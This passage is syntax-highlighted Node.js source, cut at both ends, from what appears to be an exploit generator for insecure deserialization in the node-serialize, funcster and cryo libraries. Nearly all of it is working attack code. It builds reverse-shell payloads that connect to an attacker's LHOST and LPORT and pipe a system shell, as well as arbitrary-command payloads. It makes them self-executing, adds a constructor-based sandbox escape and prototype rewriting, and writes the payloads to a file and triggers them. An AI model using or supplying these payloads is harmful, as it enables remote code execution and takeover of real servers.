    <span class="p">.</span><span class="nx">showHelpOnFail</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="s2">&quot;Specify --help for available options&quot;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">argv</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">payload</span><span class="p">;</span>

<span class="c1">// Serialize function wrap</span>
<span class="kd">function</span> <span class="nx">serialize</span><span class="p">(</span><span class="nx">serializer</span><span class="p">,</span> <span class="nx">object</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;fstr&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;funcster&#39;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">serialize</span><span class="p">.</span><span class="nx">deepSerialize</span><span class="p">(</span><span class="nx">object</span><span class="p">),</span><span class="kc">null</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;ns&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-serialize&#39;</span><span class="p">).</span><span class="nx">serialize</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;cryo&#39;</span><span class="p">).</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Deserialize function wrap</span>
<span class="kd">function</span> <span class="nx">deserialize</span><span class="p">(</span><span class="nx">serializer</span><span class="p">,</span> <span class="nx">object</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;fstr&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;funcster&#39;</span><span class="p">).</span><span class="nx">deepDeserialize</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;ns&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-serialize&#39;</span><span class="p">).</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;cryo&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cm">/* As dynamic commands couldn&#39;t be added during serialization,</span>
<span class="cm">*  these tags were applied to payload templates to allow dynamic</span>
<span class="cm">*  configuration </span>
<span class="cm">*/</span>
<span class="nx">cmd_tag</span> <span class="o">=</span> <span class="sr">/####COMMAND####/g</span><span class="p">;</span>
<span class="nx">lhost_tag</span> <span class="o">=</span> <span class="sr">/####LHOST####/g</span><span class="p">;</span>
<span class="nx">lport_tag</span> <span class="o">=</span> <span class="sr">/####LPORT####/g</span><span class="p">;</span>
<span class="nx">shell_tag</span> <span class="o">=</span> <span class="sr">/####SHELL####/g</span><span class="p">;</span>
<span class="nx">sentinel_tag</span> <span class="o">=</span> <span class="sr">/\/\/####SENTINEL####\s*}/g</span><span class="p">;</span>
<span class="nx">proto_tag</span><span class="o">=</span><span class="sr">/function_prototype/g</span><span class="p">;</span>

<span class="c1">//BEGIN - Payload Template Generation</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rshell&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">!=</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lport</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lhost</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[-] RShell vector requires LHOST and LPORT to be specified&quot;</span><span class="p">);</span>
        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">rce</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;net&#39;</span><span class="p">);</span>
            <span class="kd">var</span> <span class="nx">spawn</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">spawn</span><span class="p">;</span>
            <span class="nx">HOST</span> <span class="o">=</span> <span class="s2">&quot;####LHOST####&quot;</span><span class="p">;</span>
            <span class="nx">PORT</span> <span class="o">=</span> <span class="s2">&quot;####LPORT####&quot;</span><span class="p">;</span>
            <span class="nx">TIMEOUT</span> <span class="o">=</span> <span class="s2">&quot;5000&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">contains</span> <span class="o">===</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">contains</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">it</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">it</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
                <span class="p">};</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
                <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="nx">HOST</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">sh</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s2">&quot;####SHELL####&quot;</span><span class="p">,</span> <span class="p">[]);</span>
                    <span class="nx">client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;Connected!&quot;</span><span class="p">);</span>
                    <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
                    <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
                    <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
                    <span class="nx">sh</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">signal</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">client</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">&quot;Disconnected!&quot;</span><span class="p">);</span>
                    <span class="p">});</span>
                <span class="p">});</span>
                <span class="nx">client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">),</span> <span class="nx">TIMEOUT</span><span class="p">);</span>
                <span class="p">});</span>
            <span class="p">}</span>
            <span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">);</span><span class="c1">//####SENTINEL####</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rshell&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lport</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lhost</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[-] RShell vector requires LHOST and LPORT to be specified&quot;</span><span class="p">);</span>
        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">__proto</span><span class="o">:</span> <span class="p">{</span>
            <span class="nx">function_prototype</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;net&#39;</span><span class="p">);</span>
                <span class="kd">var</span> <span class="nx">spawn</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">spawn</span><span class="p">;</span>
                <span class="nx">HOST</span> <span class="o">=</span> <span class="s2">&quot;####LHOST####&quot;</span><span class="p">;</span>
                <span class="nx">PORT</span> <span class="o">=</span> <span class="s2">&quot;####LPORT####&quot;</span><span class="p">;</span>
                <span class="nx">TIMEOUT</span> <span class="o">=</span> <span class="s2">&quot;5000&quot;</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">contains</span> <span class="o">===</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">contains</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">it</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">it</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
                    <span class="p">};</span>
                <span class="p">}</span>

                <span class="kd">function</span> <span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
                    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="nx">HOST</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">sh</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;####SHELL####&#39;</span><span class="p">,</span> <span class="p">[]);</span>
                        <span class="nx">client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;Connected!&quot;</span><span class="p">);</span>
                        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
                        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
                        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
                        <span class="nx">sh</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">signal</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">client</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">&quot;Disconnected!&quot;</span><span class="p">);</span>
                        <span class="p">});</span>
                    <span class="p">});</span>
                    <span class="nx">client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">),</span> <span class="nx">TIMEOUT</span><span class="p">);</span>
                    <span class="p">});</span>
                <span class="p">}</span>
                <span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">);</span><span class="c1">//####SENTINEL####</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rce&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">!=</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">command</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[-] RCE vector requires a command to be specified&quot;</span><span class="p">);</span>
        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">rce</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">CMD</span> <span class="o">=</span> <span class="s2">&quot;####COMMAND####&quot;</span><span class="p">;</span>
            <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">CMD</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span>
            <span class="p">});</span><span class="c1">//####SENTINEL####</span>
        <span class="p">},</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rce&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">command</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[-] RCE vector requires a command to be specified&quot;</span><span class="p">);</span>
        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">__proto</span><span class="o">:</span> <span class="p">{</span>
            <span class="nx">function_prototype</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                <span class="nx">CMD</span> <span class="o">=</span> <span class="s2">&quot;####COMMAND####&quot;</span><span class="p">;</span>
                <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">CMD</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span>
                <span class="p">});</span><span class="c1">//####SENTINEL####</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">rce</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;cmd /c calc&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span>
            <span class="p">});</span><span class="c1">//####SENTINEL####</span>
        <span class="p">},</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">//END - Payload Template Generation</span>

<span class="c1">//BEGIN - Payload Customization</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">mode</span> <span class="o">==</span> <span class="s2">&quot;serialize&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span><span class="p">,</span> <span class="nx">payload</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Prototype rewriting</span>
        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;__proto&quot;</span><span class="p">,</span> <span class="s2">&quot;__proto__&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// Beautify</span>
    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/(\\t|\\n)/gmi</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">);</span>
    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/(\s+)/gmi</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
    <span class="c1">// Setting up CMD (if applicable)</span>
    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">cmd_tag</span><span class="p">,</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">command</span><span class="p">);</span>
    <span class="c1">// Setting up RSHELL (if applicable)</span>
    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">lhost_tag</span><span class="p">,</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lhost</span><span class="p">);</span>
    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">lport_tag</span><span class="p">,</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lport</span><span class="p">);</span>
    <span class="c1">// Setting up shell basing on OS</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">target</span> <span class="o">==</span> <span class="s2">&quot;windows&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">shell_tag</span><span class="p">,</span> <span class="s2">&quot;cmd&quot;</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">target</span> <span class="o">==</span> <span class="s2">&quot;linux&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">shell_tag</span><span class="p">,</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// Making payload executable with &quot;()&quot;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">serialized_object</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;####SENTINEL####&quot;</span><span class="p">)){</span>
        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">sentinel_tag</span><span class="p">,</span> <span class="s1">&#39;}()&#39;</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;&quot;}}&#39;</span><span class="p">,</span> <span class="s1">&#39;()&quot;}}&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;fstr&quot;</span> <span class="o">||</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">){</span>
            <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">proto_tag</span><span class="p">,</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">cryoprototype</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rce&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Modifying RCE payload to bypass the sandbox via this.constructor.constructor</span>
            <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;require(&#39;child_process&#39;)&quot;</span><span class="p">,</span> <span class="s2">&quot;const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;)&quot;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rshell&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Modifying RSHELL payload to bypass the sandbox via this.constructor.constructor</span>
            <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;var net=require(&#39;net&#39;);var spawn=require(&#39;child_process&#39;).spawn;&quot;</span><span class="p">,</span> <span class="s2">&quot;const process = this.constructor.constructor(&#39;return this.process&#39;)();var spawn=process.mainModule.require(&#39;child_process&#39;).spawn;var net=process.mainModule.require(&#39;net&#39;);&quot;</span><span class="p">);</span>
            <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;var net = require(&#39;net&#39;);var spawn = require(&#39;child_process&#39;).spawn;&quot;</span><span class="p">,</span> <span class="s2">&quot;const process = this.constructor.constructor(&#39;return this.process&#39;)();var spawn=process.mainModule.require(&#39;child_process&#39;).spawn;var net=process.mainModule.require(&#39;net&#39;);&quot;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// Debug check</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">serialized_object</span><span class="p">);</span>
    <span class="c1">// Storing on file</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFile</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">serialized_object</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[+] Serializing payload&#39;</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">mode</span> <span class="o">==</span> <span class="s2">&quot;deserialize&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Reading payload from file</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[+] Deserializing payload&#39;</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">object</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
        <span class="c1">// cryo handles JSON directly - no need to JSON.parse</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">!=</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">object</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
        <span class="c1">// Triggering RCE</span>
        <span class="kd">var</span> <span class="nx">deser</span> <span class="o">=</span> <span class="nx">deserialize</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span><span class="p">,</span> <span class="nx">object</span><span class="p">);</span>
        <span class="c1">// Triggering RCE for Cryo</span>
